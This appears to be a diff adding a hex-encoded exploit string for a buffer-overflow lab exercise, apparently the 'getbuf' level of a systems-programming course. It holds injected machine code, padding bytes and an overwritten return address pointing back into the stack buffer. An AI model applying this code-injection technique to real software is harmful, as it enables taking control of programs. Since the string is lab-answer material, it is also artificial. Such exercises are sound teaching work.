@@ -1,0 +1,6 @@
+b8 11 11 11 11 a3 00 d1 /* CodeForLevel2Ass */ 
+04 08 68 9d 8c 04 08 c3 /* CodeForLevel2Ass */ 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 58 34 68 55 /* buf address when enter getbuf, %eax */ 
